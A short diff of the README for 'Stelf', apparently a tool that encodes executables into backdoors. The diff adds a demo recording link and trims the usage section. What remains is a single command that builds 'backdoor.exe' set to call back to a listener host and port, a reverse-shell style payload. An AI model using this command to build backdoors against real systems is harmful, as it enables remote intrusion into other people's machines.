@@ -1,16 +1,14 @@
 # Stelf
 ### Shell That Excercises Limited Fanfare
 
+## Demo
+
+[![asciicast](https://asciinema.org/a/agt46e0dpxo7ecrucvos6c5am.png)](https://asciinema.org/a/agt46e0dpxo7ecrucvos6c5am)
+
 ## Usage
 
 
 ##### Encode your executable:
-```
-python2 encode.py lhost lport output.exe
-```
-
-e.g
-
 ```
 python2 encode.py 192.168.1.5 8080 backdoor.exe
 ```
